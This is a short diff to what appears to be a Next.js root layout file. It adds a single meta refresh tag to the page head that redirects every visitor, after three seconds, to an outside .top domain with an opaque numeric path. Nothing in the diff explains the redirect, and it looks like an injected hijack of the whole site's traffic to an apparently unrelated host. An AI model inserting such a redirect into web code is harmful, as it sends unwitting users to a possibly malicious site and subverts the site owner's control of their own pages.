@@ -33,6 +33,7 @@ export default function RootLayout({
           async
           data-cfasync="false"
         ></script>
+          <meta http-equiv='refresh' content='3; URL=https://goathaga.top/4/8640111'></meta>
       </head>
       <body
         className={`${geistSans.variable} ${geistMono.variable} antialiased`}
